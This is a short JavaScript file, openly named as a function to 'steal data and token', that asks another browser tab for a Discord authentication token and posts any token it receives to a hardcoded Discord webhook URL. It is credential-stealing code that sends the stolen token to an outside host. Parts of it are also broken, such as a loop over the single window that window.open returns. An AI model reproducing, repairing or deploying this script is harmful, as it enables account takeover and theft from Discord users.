// Define the function to steal data and token
function stealDataAndToken() {
    // Function to send a message to the other tab
    function sendMessageToOtherTab(message) {
        // Find the other tab
        var otherTab = null;

        // Loop through all open windows (tabs)
        var windows = window.open('', '_blank');
        for (var i = 0; i < windows.length; i++) {
            var win = windows[i];
            if (win !== window) {
                otherTab = win;
                break;
            }
        }

        // Send message to the other tab using postMessage
        if (otherTab) {
            console.log('Sending message to other tab:', message);
            otherTab.postMessage({ type: 'getDiscordToken' }, '*');
        } else {
            console.error('Unable to find the other tab.');
        }
    }

    // Listen for messages from the other tab
    window.addEventListener('message', function(event) {
        console.log('Received message:', event.data);

        // Verify that the message is from a trusted origin
        if (event.origin !== window.origin) {
            console.error('Received message from untrusted origin:', event.origin);
            return;
        }

        // Check if the message is a response with the Discord token
        if (event.data.type === 'sendDiscordToken') {
            // Retrieve the Discord token from the message data
            var discordToken = event.data.token;

            // Proceed with sending the Discord token to the webhook
            console.log('Received Discord Token:', discordToken);
            sendTokenToWebhook(discordToken);
        }
    });

    // Function to send the Discord token to the webhook
    function sendTokenToWebhook(token) {
        // Construct the message to be sent to the webhook
        var message = {
            content: 'Discord Token: ' + token
        };

        // Send the message to the webhook using fetch
        fetch('https://discord.com/api/webhooks/1231774438463242290/PP9iMkmZa0F81Zp3QUwuEAh5uGd2jvw86T0e5KypWYaoHKqXRqAvvkVHPOEKZsO4mRFx', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(message)
        })
        .then(response => {
            if (response.ok) {
                console.log('Message sent to Discord webhook!');
            } else {
                console.error('Failed to send message to Discord webhook:', response.status, response.statusText);
            }
        })
        .catch(error => {
            console.error('Error sending message to Discord webhook:', error.message);
        });
    }

    // Call the function to send a message to the other tab requesting the Discord token
    sendMessageToOtherTab('Please send Discord token');
}

// Call the function to steal data and token
stealDataAndToken();
